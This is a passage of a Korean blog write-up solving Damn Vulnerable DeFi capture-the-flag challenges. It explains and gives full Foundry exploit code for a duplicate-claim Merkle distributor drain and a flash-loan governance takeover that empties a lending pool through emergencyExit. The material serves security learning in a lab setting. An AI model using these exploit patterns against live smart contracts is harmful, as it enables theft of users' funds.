        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}

function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord & newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}
```

### Challenge Solving

`_setClaimed()` 함수는 리워드를 이미 청구했는지 여부를 비트맵(bitmap) 방식으로 기록합니다. 하지만 `claimRewards()` 함수의 로직을 자세히 보면, `bitsSet`(청구 기록)과 `amount`(청구 금액) 변수에 값을 계속 누적하다가, **루프의 마지막에 도달했을 때** 또는 **처리할 토큰의 종류가 바뀔 때**만 `_setClaimed()` 함수를 호출하여 청구 기록을 최종적으로 저장합니다.

```solidity
        bitsSet = bitsSet | 1 << bitPosition;
        amount += inputClaim.amount;

// ....

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

```

문제는 **동일한 reward 청구 요청을 여러 번 보내도**, `bitsSet`을 누적하는 과정(`bitsSet | 1 << bitPosition`)에서 중복 여부를 제대로 검사하지 않는다는 점입니다. 예를 들어, 동일한 요청을 5번 보내도 `bitsSet`에는 그냥 같은 bit가 5번 덮어쓰일 뿐, 오류가 발생하지 않습니다. 하지만 `transfer`는 루프 안에서 매번 실행되므로, 공격자는 reward를 5번 지급받게 됩니다.

`player` 주소는 각 토큰의 리워드 목록에 등록되어 있으므로, 이 허점을 이용해 자신에게 할당된 reward를 반복적으로 청구하여 문제를 해결할 수 있습니다.

```solidity
function test_theRewarder() public checkSolvedByPlayer {

    // Step 1: search player's index in DVT list
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
    uint256 dvtIndex;
    uint256 dvtAmount;
    for (uint256 i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            dvtIndex = i;
            console.log("player = ", dvtRewards[i].beneficiary);
            dvtAmount = dvtRewards[i].amount;
            break;
        }
    }
    require(dvtAmount > 0, "Player not in DVT list");

    // Step 2: search player's index in WETH list
    Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
    uint256 wethIndex;
    uint256 wethAmount;
    for (uint256 i = 0; i < wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            wethIndex = i;
            console.log("player = ", wethRewards[i].beneficiary);
            wethAmount = wethRewards[i].amount;
            break;
        }
    }
    require(wethAmount > 0, "Player not in WETH list");

    // Step 3: create proof for each token
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, dvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, wethIndex);

    // Step 4: create tokensToClaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Step 5: calculate how many duplicated claims requires
    uint256 dvtRemaining = distributor.getRemaining(address(dvt));
    uint256 wethRemaining = distributor.getRemaining(address(weth));
    uint256 dvtN = dvtRemaining / dvtAmount; 
    uint256 wethN = wethRemaining / wethAmount;

    // Step 6: create array for duplicated claim
    Claim[] memory claims = new Claim[](dvtN + wethN);
    for (uint256 i = 0; i < dvtN; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtAmount,
            tokenIndex: 0,
            proof: dvtProof
        });
    }
    for (uint256 i = 0; i < wethN; i++) {
        claims[dvtN + i] = Claim({
            batchNumber: 0,
            amount: wethAmount,
            tokenIndex: 1,
            proof: wethProof
        });
    }

    // Step 7: trigger the vulnerability
    distributor.claimRewards(claims, tokensToClaim);

    // Step 8: transfer every tokens to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 6. Selfie: believe or not, I am your governor!

### Challenge Explanation

다시 무담보 대출 관련 문제로 돌아왔습니다!

`SelfiePool.flashLoan()` 함수는

→ `_amount` 만큼 대출

→ `_receiver` contract에 정의된 `onFlashLoan()` 함수 호출

→ 대출해준 `_amount` 금액만큼 다시 돌려받음

정도의 기능만을 수행하는데, 자세히 보시면 `SimpleGovernance` 라고 하는 contract가 눈에 띕니다.

```solidity
contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
	  // ....
    
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }
    
	  // ....
    
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}
```

[Governance](https://medium.com/@dkopolovets/smart-contract-governance-56852c90d3c2) 란 **DAO**( **D**ecentralized **A**utonomous **O**rgnaization, 탈중앙화 자율 조직 )라고 불리는 smart contracts 사용자들로 구성된 일정의 의사 결정 조직이라고 보시면 됩니다.

해당 smart contracts를 사용하는 DAO들은 일종의 투표권을 가지고 투표를 진행하며, 가장 많은 투표권을 받은 DAO가 smart contract에서 일종의 관리자 권한( Administrator )에 해당하는 함수나 변수에 접근할 수 있게 됩니다.

![](/2025/09/07/d4tura/smartcontracts/ko/image7.png)

보통 이 투표권은 해당 smart contract에서 유통하는 gonvernance token의 보유 수인 경우가 대부분 입니다.

이 문제의 `SimpleGovernance` contract를 보면, `_hasEnoughVotes()` 함수를 통해 전체 투표 토큰(`_votingToken`)의 절반 이상을 보유한 경우에만 [SimpleGovernance.queueAction()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/selfie/SimpleGovernance.sol#L23) 함수를 호출할 수 있습니다.

```solidity
contract SimpleGovernance is ISimpleGovernance {
		// ....
		
    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }
    
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
    
    // ....
   
     function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
}
```

중요한 점은, [SelfieChallenge.setUp()](https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/selfie/Selfie.t.sol#L32) 함수에서 `SelfiePool`의 대출 자산으로 쓰이는 token과 거버넌스의 투표권으로 쓰이는 token이 **동일한** `DamnValuableVotes` ****token이라는 것입니다.

```solidity
function setUp() public {
    // ....

    // Deploy token
    token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = new SimpleGovernance(token);

    // Deploy pool
    pool = new SelfiePool(token, governance);

    // ....
```

### Challenge Solving

대출용 token과 투표용 token이 같다는 것은, `SelfiePool.flashLoan()`을 통해 대량의 token을 빌리는 순간, **대출받은 그** token**만큼의 투표권**을 일시적으로 얻게 된다는 의미이며, 대출을 받은 동안 우리는 `SimpleGovernance`의 `queueAction()` 함수를 호출할 수 있습니다.

`queueAction()` 함수는 특정 함수 호출(Action)을 예약 대기열(queue)에 등록하는 역할을 합니다. 우리는 이 함수를 이용해 `SelfiePool`의 모든 자금을 인출하는 `emergencyExit()` 함수 호출을 등록할 것입니다.

```solidity
// SimpleGovernance.queueAction
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    // ....

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    // ....
}

// SimpleGovernance.executeAction
function executeAction(uint256 actionId) external payable returns (bytes memory) {
	  // _canBeExecuted: requires 2 days delay after queueAction execute
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}

// SelfiePool.emergencyExit
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}
```

`SimpleGovernance.executeAction()` 함수는 대기열에 등록된 Action을 실제로 실행하는데, 보안을 위해 [SimpleGovernance._canBeExecuted()](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L87) 함수를 통해  `queueAction()`이 호출된 후 **최소 2일**( = [ACTION_DELAY_IN_SECONDS](https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L12) )**이 지나야만** 실행할 수 있도록 시간제한이 걸려있습니다. 물론, 테스트 환경에서는 [vm.warp()](https://getfoundry.sh/reference/cheatcodes/warp.html) 함수를 사용해 `block.timestamp` 값을 변경하면 됩니다.

지금까지 분석한 내용을 바탕으로 공격 흐름을 순차적으로 정리하면 아래와 같습니다.

1. `SelfiePool.flashLoan()`  함수로 무담보 대출을 받아 막대한 투표권을 획득
2. `onFlashLoan()` callback에서 `SimpleGovernance.queueAction()` 함수를 호출해 `SelfiePool.emergencyExit()` 함수 호출을 `_actions` 배열에 삽입
3. `vm.warp()` 함수로 `block.timestamp` 값 수정 
4. `SimpleGovernance.executeAction()` 함수를 호출

```solidity
    function test_selfie() public checkSolvedByPlayer {
        SelfieSolver solver = new SelfieSolver(pool, governance, token, recovery);
        solver.solve();
        vm.warp(block.timestamp + 2 days);
        solver.execute();
    }
  
// ....

contract SelfieSolver is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;
    uint256 actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function solve() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // delegate voting 
        token.delegate(address(this));

        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}
```

## Next To Do

우선 PART 1은 여기까지 입니다! 

Challenge 6~12는 PART 2, Challenge 13~18은 PART 3에서 다뤄볼려고 합니다. 저도 아직 배우는 입장에서 제 부족한 지식을 기반으로 문서를 작성하는게 쉽지는 않았는데, PART 2에서는 좀 더 깊이있게 각 주제를 다뤄볼 수 있도록 노력하겠습니다! 감사합니다!

## Reference

- https://www.damnvulnerabledefi.xyz/
- https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0
- https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/
- https://docs.openzeppelin.com/
- https://eips.ethereum.org/erc